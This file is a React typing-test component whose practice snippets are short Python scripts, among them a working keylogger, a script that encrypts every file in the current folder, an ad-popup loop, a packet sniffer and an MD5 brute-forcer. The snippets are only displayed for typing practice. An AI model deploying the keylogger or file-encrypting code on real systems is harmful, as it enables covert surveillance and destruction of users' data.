"use client"

import { useState, useRef, useEffect } from "react"
import { useAuth } from "./auth-context"

const PYTHON_SNIPPETS = [
  `import webbrowser
import time
import random

urls = [
    "https://example.com/ad1",
    "https://example.com/ad2", 
    "https://example.com/ad3"
]

while True:
    webbrowser.open(random.choice(urls))
    time.sleep(30)`,

  `from pynput import keyboard
def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(key.char)
        except:
            f.write(f" [{key.name}] ")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()`,

  `from scapy.all import *
def packet_handler(packet):
    if packet.haslayer(IP):
        print(f"Source: {packet[IP].src} -> Destination: {packet[IP].dst}")
sniff(prn=packet_handler)`,

  `import os
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
for file in os.listdir("."):
    if os.path.isfile(file) and file != __file__:
        try:
            with open(file, "rb") as f:
                data = f.read()
            encrypted = cipher.encrypt(data)
            with open(file, "wb") as f:
                f.write(encrypted)
        except:
            pass

with open("key.key", "wb") as key_file:
    key_file.write(key)`,

  `import pyscreenshot as ImageGrab

image = ImageGrab.grab()
image.save("screenshot.png")`,

  `import socket
import threading

def handle_client(client_socket):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        client_socket.send(data)
    client_socket.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 9999))
server.listen(5)`,

  `import subprocess
import sys

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, 
                              capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

command = input("Enter command: ")
output = execute_command(command)
print(output)`,

  `import hashlib
import itertools
import string

def crack_hash(target_hash, max_length=4):
    chars = string.ascii_lowercase + string.digits
    for length in range(1, max_length + 1):
        for combo in itertools.product(chars, repeat=length):
            password = ''.join(combo)
            if hashlib.md5(password.encode()).hexdigest() == target_hash:
                return password
    return None`
]

export default function TypingTest({ onScoreSaved, tests, onStartTest, autoStart = false }) {
  const snippets = tests && tests.length > 0 ? tests : PYTHON_SNIPPETS
  const { user } = useAuth()
  const [currentSnippet, setCurrentSnippet] = useState(snippets[0])
  const [userInput, setUserInput] = useState("")
  const [isActive, setIsActive] = useState(false)
  const [timeLeft, setTimeLeft] = useState(60)
  const [wpm, setWpm] = useState(0)
  const [accuracy, setAccuracy] = useState(100)
  const [testComplete, setTestComplete] = useState(false)
  const codeDisplayRef = useRef(null)

  useEffect(() => {
    let timer
    if (isActive && timeLeft > 0) {
      timer = setInterval(() => {
        setTimeLeft((prev) => prev - 1)
      }, 1000)
    } else if (timeLeft === 0 && isActive) {
      endTest()
    }
    return () => clearInterval(timer)
  }, [isActive, timeLeft])

  useEffect(() => {
    if (isActive) {
      calculateStats()
      // Auto-end test when user completes typing the entire snippet
      if (userInput.length === currentSnippet.length && userInput === currentSnippet) {
        endTest()
      }
    }
  }, [userInput])

  // Auto-start test if autoStart is true
  useEffect(() => {
    if (autoStart && !isActive && !testComplete) {
      const timer = setTimeout(() => {
        setIsActive(true)
        setUserInput("")
        setTimeLeft(60)
        setTestComplete(false)
        codeDisplayRef.current?.focus()
      }, 500) // Small delay to ensure component is ready
      return () => clearTimeout(timer)
    }
  }, [autoStart, isActive, testComplete])

  const calculateStats = () => {
    const words = userInput.trim().split(/\s+/).length
    const timeElapsed = 60 - timeLeft
    const currentWpm = timeElapsed > 0 ? Math.round((words / timeElapsed) * 60) : 0
    setWpm(currentWpm)

    let correctChars = 0
    for (let i = 0; i < userInput.length; i++) {
      if (userInput[i] === currentSnippet[i]) {
        correctChars++
      }
    }
    const currentAccuracy = userInput.length > 0 ? Math.round((correctChars / userInput.length) * 100) : 100
    setAccuracy(currentAccuracy)
  }

  const startTest = () => {
    if (onStartTest) {
      onStartTest(currentSnippet)
    } else {
      setIsActive(true)
      setUserInput("")
      setTimeLeft(60)
      setTestComplete(false)
      codeDisplayRef.current?.focus()
    }
  }

  const endTest = () => {
    setIsActive(false)
    setTestComplete(true)
    const score = {
      id: Date.now(),
      wpm: wpm,
      accuracy: accuracy,
      timestamp: new Date().toLocaleString(),
      snippet: currentSnippet.split("\n")[0],
      username: user?.username || user?.email || "Anonymous",
    }
    onScoreSaved(score)
  }

  const resetTest = () => {
    setUserInput("")
    setTimeLeft(60)
    setWpm(0)
    setAccuracy(100)
    setTestComplete(false)
    setIsActive(false)
    const randomSnippet = snippets[Math.floor(Math.random() * snippets.length)]
    setCurrentSnippet(randomSnippet)
  }

  const handleKeyDown = (e) => {
    if (!isActive || testComplete) return

    if (e.key.length === 1 || e.key === "Enter" || e.key === " ") {
      e.preventDefault()
      const newInput = userInput + e.key
      if (newInput.length <= currentSnippet.length) {
        setUserInput(newInput)
      }
    } else if (e.key === "Backspace") {
      e.preventDefault()
      setUserInput(userInput.slice(0, -1))
    }
  }

  return (
    <div className="space-y-8">
      {/* Stats */}
      <div className="grid grid-cols-4 gap-4">
        <div className="bg-card border border-border rounded-lg p-6">
          <div className="text-muted-foreground text-sm mb-2">Time Left</div>
          <div className="text-3xl font-bold text-accent">{timeLeft}s</div>
        </div>
        <div className="bg-card border border-border rounded-lg p-6">
          <div className="text-muted-foreground text-sm mb-2">WPM</div>
          <div className="text-3xl font-bold">{wpm}</div>
        </div>
        <div className="bg-card border border-border rounded-lg p-6">
          <div className="text-muted-foreground text-sm mb-2">Accuracy</div>
          <div className="text-3xl font-bold">{accuracy}%</div>
        </div>
        <div className="bg-card border border-border rounded-lg p-6">
          <div className="text-muted-foreground text-sm mb-2">Progress</div>
          <div className="text-3xl font-bold">
            {userInput.length}/{currentSnippet.length}
          </div>
        </div>
      </div>

      <div
        ref={codeDisplayRef}
        onKeyDown={handleKeyDown}
        tabIndex={0}
        className="bg-card border border-border rounded-lg p-8 font-mono focus:outline-none focus:ring-2 focus:ring-accent cursor-text"
      >
        <pre className="text-foreground whitespace-pre-wrap break-words text-4xl leading-relaxed">
          {currentSnippet.split("").map((char, idx) => {
            let charClass = "text-muted-foreground"
            if (idx < userInput.length) {
              charClass = userInput[idx] === char ? "text-green-500 font-bold" : "text-destructive font-bold"
            } else if (idx === userInput.length) {
              charClass = "bg-accent/30 animate-pulse"
            }
            return (
              <span key={idx} className={charClass}>
                {char}
              </span>
            )
          })}
        </pre>
      </div>

      {/* Buttons */}
      <div className="flex gap-4">
        {!isActive && !testComplete && (
          <button
            onClick={startTest}
            className="px-8 py-3 bg-accent text-accent-foreground rounded-lg font-semibold hover:opacity-90 transition-opacity"
          >
            Start Test
          </button>
        )}
        {isActive && (
          <button
            onClick={endTest}
            className="px-8 py-3 bg-destructive text-destructive-foreground rounded-lg font-semibold hover:opacity-90 transition-opacity"
          >
            End Test
          </button>
        )}
        {testComplete && (
          <>
            <button
              onClick={resetTest}
              className="px-8 py-3 bg-accent text-accent-foreground rounded-lg font-semibold hover:opacity-90 transition-opacity"
            >
              Try Again
            </button>
            <button
              onClick={() => {
                resetTest()
                const randomSnippet = snippets[Math.floor(Math.random() * snippets.length)]
                setCurrentSnippet(randomSnippet)
              }}
              className="px-8 py-3 bg-primary text-primary-foreground rounded-lg font-semibold hover:opacity-90 transition-opacity"
            >
              New Snippet
            </button>
          </>
        )}
      </div>

      {/* Test Complete Message */}
      {testComplete && (
        <div className="bg-card border border-border rounded-lg p-6 text-center">
          <h3 className="text-xl font-bold mb-2">Test Complete!</h3>
          <p className="text-muted-foreground">Your score has been saved to the leaderboard.</p>
        </div>
      )}
    </div>
  )
}
